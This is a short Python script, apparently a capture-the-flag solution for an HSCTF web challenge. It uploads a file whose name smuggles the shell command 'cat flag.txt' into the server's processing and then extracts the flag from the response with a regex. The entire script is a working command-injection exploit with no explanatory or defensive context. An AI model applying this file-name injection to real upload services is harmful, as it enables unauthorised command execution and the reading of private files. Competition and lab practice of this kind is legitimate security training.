import requests
import re
#URL = "http://localhost:8004"
URL = "http://web1.hsctf.com:8004"
resp = requests.post(URL, files={"file": ("';cat flag.txt 1>&2; exit 1;'.png", "")})
print(re.search(r"flag{.*?}", resp.text).group(0))
